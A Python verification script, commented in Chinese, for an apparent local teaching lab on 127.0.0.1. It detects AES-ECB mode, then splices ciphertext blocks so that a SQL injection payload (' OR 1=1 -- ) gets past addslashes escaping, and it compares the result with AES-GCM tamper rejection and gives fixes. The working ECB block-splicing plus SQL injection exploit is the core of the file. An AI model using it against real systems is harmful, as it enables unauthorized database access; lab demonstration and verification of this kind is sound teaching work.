#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_ecblab.py — ECB Block Splicing 驗證
=============================================================================

 驗證特色（與 known-plaintext 不同）：
   E1 不是「推出金鑰」，而是**偵測 ECB 模式**（重複 block）
   E2 不是「偽造密文」，而是**拼接密文 block** 改變明文
   E3 不是「篡改單一位元」，而是**整塊替換**

 用法：
   python verify_ecblab.py 8980
=============================================================================
"""

import base64
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8980
BASE = "http://127.0.0.1:%d" % PORT
results = []


def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=20) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def jget(path):
    st, body = get(path)
    try:
        return st, json.loads(body)
    except Exception:                                        # noqa: BLE001
        return st, {}


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def search(query):
    st, j = jget("/search?query=" + urllib.parse.quote(query, safe=""))
    return j.get("ciphertext_b64", "")


def result(ct_b64):
    st, j = jget("/result?q=" + urllib.parse.quote(ct_b64, safe=""))
    return st, j


def main():
    print("=" * 76)
    print(" ECBLab 驗證 — ECB Block Splicing")
    print(" 目標：%s" % BASE)
    print("=" * 76)

    st, _ = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線")
        sys.exit(1)

    # ============ E1：ECB 模式偵測 ============
    # 用重複的 query 產生重複明文 block
    q_rep = "B" * 11 + "A" * 32
    ct_rep = search(q_rep)
    st1, j1 = jget("/detect?q=" + urllib.parse.quote(ct_rep, safe=""))
    dupes = j1.get("duplicates", [])
    ev = [
        "請求      : /search?query= B*11 + A*32 (讓 A 對齊 block 邊界)",
        "偵測      : /detect?q=<密文>",
        "重複 block: %s" % (dupes if dupes else "（無）"),
        "說明      : ECB 模式下「相同明文 block → 相同密文 block」",
        "預期漏洞  : 可從密文中偵測出重複模式",
        "根因      : AES-ECB 對每個 16-byte block 獨立加密（無 IV、無鏈結）",
        "危害      : 洩漏明文結構（可用於 block splicing）",
        "驗證方式  : **檢查密文中是否有重複的 16-byte block**",
        "修補方向  : 使用 CBC/GCM（帶 IV）或認證加密",
        "OWASP 對照: CWE-327（使用有缺陷的加密演算法）",
    ]
    check("E1 ECB 模式（重複 block 可偵測）", "CWE-327",
          len(dupes) > 0, "\n".join(ev))

    # ============ E2：直接注入失敗（被 addslashes）============
    q_inj = "A" * 10 + "' OR 1=1 -- "
    ct_inj = search(q_inj)
    st2, j2 = result(ct_inj)
    # ★ 判定改為「SQL 中是否含轉義的引號（\\'）」
    #   （SQLite 不支援 MySQL 的 \' 轉義，所以不能靠執行結果判斷）
    sql_direct = j2.get("sql", "")
    escaped = ("\\'" in sql_direct) or ("\\'" in sql_direct)
    direct_ok = escaped
    ev = [
        "請求      : /search?query=" + q_inj,
        "            （伺服器會 addslashes：' → \\'）",
        "直接執行  : /result?q=<該密文>",
        "SQL 中的轉義: %s" % ("有 \\' （被 addslashes 擋住）" if escaped else "無（未轉義）"),
        "SQL       : %s" % j2.get("sql", "")[:180],
        "錯誤      : %s" % j2.get("error", "（無）"),
        "說明      : 直接注入被 addslashes 擋住（單引號被轉義）",
        "          → 需要 Block Splicing 繞過",
    ]
    check("E2 對照：直接注入被 addslashes 擋住", "防護觀察",
          escaped, "\n".join(ev))

    # ============ E3：Block Splicing ============
    ct_a = search("A" * 10)          # 乾淨的 block 2
    ct_b = search(q_inj)             # 含 \' 的 block 2
    # 拼接：C1[0:48] + C2[48:]
    #   C1 block2 = PREFIX[32:37] + "A"*10 + "%"
    #   C2 block3 = "' OR 1=1 -- " + ...
    a = base64.b64decode(ct_a)
    b = base64.b64decode(ct_b)
    spliced = a[:48] + b[48:]
    spliced_b64 = base64.b64encode(spliced).decode()
    st3, j3 = result(spliced_b64)
    spliced_ok = j3.get("ok", False) and j3.get("row_count", 0) > 1
    ev = [
        "C1（乾淨）: /search?query=" + "A"*10,
        "            block2 = PREFIX[32:37] + 'A'*10 + '%'",
        "C2（轉義）: /search?query=" + q_inj,
        "            block2 = PREFIX[32:37] + 'A'*10 + '\\\\'",
        '            block3 = "\' OR 1=1 -- "...',
        "★ 拼接    : C1[0:48] + C2[48:]，去掉 block2 結尾的反斜線",
        "解密後 SQL: %s" % j3.get("sql", "")[:220],
        "執行結果  : ok=%s, row_count=%s" % (j3.get("ok"), j3.get("row_count")),
        "預期漏洞  : 不需金鑰，只靠**操作密文 block** 改變明文",
        "根因      : (a) ECB 模式（block 獨立）",
        "            (b) addslashes 是「字串替換」，可被 block 邊界繞過",
        "            (c) 解密後直接執行 SQL（無完整性驗證）",
        "危害      : 繞過注入防護 → 任意 SQL 執行",
        "驗證方式  : **拼接密文後確認查詢被改變**（row_count 增加）",
        "修補方向  : ① 用 GCM 等認證加密",
        "            ② 參數化查詢（根本解決 SQL 注入）",
        "            ③ 不僅靠 addslashes（它是脆弱的）",
        "OWASP 對照: CWE-353（缺少完整性檢查）+ CWE-89",
    ]
    check("E3 Block Splicing（繞過 addslashes）", "CWE-353",
          spliced_ok, "\n".join(ev))

    # ============ 安全對照：AES-GCM ============
    st4, j4 = jget("/safe-search?query=hello")
    nonce = j4.get("nonce_b64", "")
    ct = j4.get("ct_b64", "")
    tag = j4.get("tag_b64", "")
    # 正常
    st5, j5 = jget("/safe-result?n=%s&c=%s&t=%s" % (
        urllib.parse.quote(nonce, safe=""),
        urllib.parse.quote(ct, safe=""),
        urllib.parse.quote(tag, safe="")))
    normal_ok = j5.get("ok", False)
    # 篡改密文
    ct_bytes = bytearray(base64.b64decode(ct))
    ct_bytes[0] ^= 0x01
    ct_tampered = base64.b64encode(bytes(ct_bytes)).decode()
    st6, j6 = jget("/safe-result?n=%s&c=%s&t=%s" % (
        urllib.parse.quote(nonce, safe=""),
        urllib.parse.quote(ct_tampered, safe=""),
        urllib.parse.quote(tag, safe="")))
    tamper_blocked = (st6 == 403) or (not j6.get("ok", True))
    ev = [
        "安全演算法: AES-GCM（帶 nonce + 認證 tag）",
        "正常請求  : /safe-result → ok=%s" % normal_ok,
        "篡改密文  : 改動第一個位元 → HTTP %s, ok=%s" % (st6, j6.get("ok")),
        "錯誤      : %s" % j6.get("error", "（無）")[:120],
        "教學意義  : **ECB 可拼接，GCM 一改就報錯**",
        "驗證方式  : 篡改後應被**拒絕**（與 E3 的「仍接受」形成對比）",
    ]
    check("安全對照：AES-GCM 阻擋篡改", "防護驗證",
          normal_ok and tamper_blocked, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-40s %-14s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  ECB 攻擊的驗證特色：")
    print("    E1 → **偵測重複 block**（看密文結構）")
    print("    E2 → 確認直接注入被擋（對照）")
    print("    E3 → **拼接密文 block 後看查詢是否改變**")
    print()
    print("  核心觀念：")
    print("    「加密」不等於「完整性」——")
    print("    攻擊者不需金鑰，只要操作密文 block 就能改變明文。")
    print("=" * 76)

    with open("ecblab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 ecblab_result.json）")


if __name__ == "__main__":
    main()
